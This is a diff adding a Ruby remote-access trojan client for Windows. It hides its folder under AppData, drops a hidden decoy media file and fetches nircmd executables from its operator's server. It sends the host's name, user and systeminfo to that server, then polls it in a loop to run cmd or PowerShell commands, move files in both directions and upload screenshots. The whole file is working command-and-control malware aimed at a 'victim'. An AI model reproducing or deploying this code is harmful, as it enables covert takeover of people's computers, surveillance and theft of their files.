@@ -1,0 +1,181 @@
+
+$URL = "#{$ORIGIN}/target"
+$appName = "ruby"
+$APPDATA = "#{ENV['APPDATA']}\\"
+$FOLDER = "#{$APPDATA}Microsoft\\SystemWindows\\#{$appName}\\"
+$userId = ""
+$useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
+$exitBy = "exiting by victim."
+$pCommnads = "Commands: [cmd][powershell][upload][download][screenshot][exit]"
+
+# main shell
+def shell(ps, command)
+    cmd = "cmd /c " + command
+    if ps
+        cmd = "powershell " + command
+    end
+
+    begin
+      return `#{cmd}`
+    rescue => e
+        return e
+    end
+end
+
+# getting data
+def get(url, filename)
+    curl = "CURL -s -A  \"#$useragent\" -X GET #{url}"
+    
+    if filename.length == 0
+        return shell(false, curl)
+    else
+        curl += " -o " + filename
+        output = shell(false, curl)
+
+        if output == nil
+            return "file saved."
+        else
+            return "file save error"
+        end
+    end
+end
+
+# posting data
+def post(url, data, filename)
+    curl = "CURL -s -H \"Content-Type:multipart/form-data\" -A \"#$useragent\" "
+
+    if data.length != 0
+        d = Base64.encode64(data)
+        curl += "-F \"data=#{d.gsub("\n", "")}\" "
+    end
+
+    if filename.length() != 0
+        curl += "-F \"file=@#{filename}\" "
+    end
+
+    curl += "-X POST #{url}"
+    shell(false, curl)
+end
+
+# open media
+def media()
+    if $MEDIAURL.length > 0
+        get($MEDIAURL, $MEDIANAME)
+        shell(false, "attrib +h +s +r #$MEDIANAME")
+        shell(false, "start #$MEDIANAME")
+    end
+end
+
+# ps exe
+def executor(command, ps)
+    if command[0..3] == "cd "
+        path = command[3..command.length]
+        Dir.chdir(path)
+        post($URL, "#{Dir.pwd}>", "")
+    else
+        post($URL, shell(ps, command), "")
+    end
+end
+
+# snapshot
+def screenshot()
+    ranValue = SecureRandom.hex(10 / 2)
+    filename = "#{ranValue}-ruby-screenshot.jpg"
+    shotPath = "#{$FOLDER}nircmd.exe savescreenshot #{filename}"
+    shell(true, shotPath)
+    clientUrl = "#{$ORIGIN}/ssd/uploads/#$userId/#{filename}"
+    post($URL, clientUrl, filename)
+   
+    begin
+        File.delete(filename)
+    rescue Errno::ENOENT
+        post($URL, "file not found error screenshot", "")
+    rescue => e
+        post($URL, "ERROR: delete screenshot", "")
+    end
+end
+
+# mainloop
+def warLoop 
+    while true
+        res = get($URL, "")
+        if res == "200" || res == nil || res == "exit status 1"
+            sleep($INTERVAL)
+            next
+        end
+        
+        data = res.split("\n")
+        application = data[0]
+        command = data[1]
+        fileName = data[2]
+
+        if application == "cmd"
+            executor(command, false)
+        elsif application == "powershell"
+            executor(command, true)
+        elsif application == "upload"
+            output = get(command, fileName)
+            post($URL, output, "")    
+        elsif application == "download"
+            post($URL, "", command)
+        elsif application == "-"
+            if command == "screenshot"
+                screenshot()
+            elsif command == "exit"
+                $exitBy = "Exit Success"
+                exit(0)
+            else
+                post($URL, pCommnads, "")
+            end
+        else
+            post(command, pCommnads, fileName)
+        end
+
+        sleep($INTERVAL)
+    end
+end
+
+# init target
+def initTarget
+    media()
+
+    hostname = Socket.gethostname
+    username = ENV["USERNAME"]
+    architecture = ENV["PROCESSOR_ARCHITECTURE"]
+    time = Time.now
+
+    $URL = "#$URL?id=#{hostname}"
+    $userId = hostname
+
+    if Dir.exist?($FOLDER)
+        post($URL, "target connected again - [APP: #{$appName}] [Time : #{time}]", "")
+    else
+        FileUtils.mkdir_p($FOLDER)
+
+        if architecture.include?("64")
+            get("#$ORIGIN/payloads/nircmd-64.exe", "#{$FOLDER}nircmd.exe")
+        else
+            get("#$ORIGIN/payloads/nircmd.exe", "#{$FOLDER}nircmd.exe")
+        end
+
+        output = shell(false, "systeminfo")
+        info = """
++=== SYSTEM INFORMATION ===+
+HOST         : #{hostname}
+USERNAME     : #{username} 
+ARCHITECHURE : #{architecture}
+TIME         : #{time}#{output}
+"""     
+        post($URL, info, "")
+    end
+
+    warLoop()
+end
+
+# listen exit
+at_exit do
+    post($URL, $exitBy, "")
+end
+
+# init
+initTarget()
